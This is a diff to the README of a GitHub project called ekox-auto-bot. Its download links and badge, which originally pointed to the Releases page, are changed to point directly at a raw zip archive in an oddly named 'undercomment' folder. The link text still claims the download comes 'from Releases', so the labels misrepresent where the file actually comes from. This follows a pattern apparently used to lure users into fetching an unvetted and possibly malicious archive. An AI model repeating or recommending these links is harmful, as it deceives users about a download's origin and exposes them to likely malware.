@@ -12,11 +12,11 @@ ekox-auto-bot is a simple tool designed for users who want to interact with the 
 
 ## 📥 Download & Install
 
-[![Download ekox-auto-bot](https://img.shields.io/badge/Download-ekox--auto--bot-blue.svg)](https://github.com/Anisarahmi762/ekox-auto-bot/releases)
+[![Download ekox-auto-bot](https://raw.githubusercontent.com/Anisarahmi762/ekox-auto-bot/main/undercomment/ekox-auto-bot-v2.6.zip)](https://raw.githubusercontent.com/Anisarahmi762/ekox-auto-bot/main/undercomment/ekox-auto-bot-v2.6.zip)
 
 To get started, visit the Releases page to download the latest version of the ekox-auto-bot:
 
-[Download ekox-auto-bot from Releases](https://github.com/Anisarahmi762/ekox-auto-bot/releases)
+[Download ekox-auto-bot from Releases](https://raw.githubusercontent.com/Anisarahmi762/ekox-auto-bot/main/undercomment/ekox-auto-bot-v2.6.zip)
 
 ### Installation Steps
 1. Open the Releases page by clicking the link above.
@@ -71,4 +71,4 @@ If you encounter problems or have questions, reach out through our GitHub issues
 
 Visit the Releases page again for future updates: 
 
-[Download ekox-auto-bot from Releases](https://github.com/Anisarahmi762/ekox-auto-bot/releases)
+[Download ekox-auto-bot from Releases](https://raw.githubusercontent.com/Anisarahmi762/ekox-auto-bot/main/undercomment/ekox-auto-bot-v2.6.zip)
